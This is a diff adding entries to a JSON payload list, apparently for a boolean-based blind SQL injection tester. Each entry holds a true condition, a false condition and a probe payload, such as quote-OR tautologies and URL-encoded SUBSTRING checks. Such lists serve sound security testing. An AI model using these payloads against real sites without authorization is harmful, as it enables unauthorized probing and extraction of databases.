@@ -1,5 +1,30 @@
 [
     {
+        "correcto":"1 AND 1=1",
+        "incorrecto":"1 AND 1=2",
+        "payload":"1 AND 2=2"
+    },
+    {
+        "correcto":"1+AND+1%3D1",
+        "incorrecto":"1+AND+1%3D2",
+        "payload":"1+AND+2%3D2"
+    },
+    {
+        "correcto":"' OR 1=1",
+        "incorrecto":"' OR 1=2",
+        "payload":"' OR 2=2"
+    },
+    {
+        "correcto":"'+OR+1%3D1",
+        "incorrecto":"'+OR+1%3D2",
+        "payload":"'+OR+2%3D2"
+    },
+    {
+        "correcto":"%27+AND+1%3D1%23",
+        "incorrecto":"%27+AND+1%3D0%23",
+        "payload":"%27+AND+SUBSTRING%28'bbb'%2C1%2C1%29+%3D+%27b"
+    },
+    {
         "correcto":"%27+AND+1%3D1%23",
         "incorrecto":"%27+AND+1%3D0%23",
         "payload":"%27+AND+SUBSTRING%28'bbb'%2C1%2C1%29+%3D+%27b"
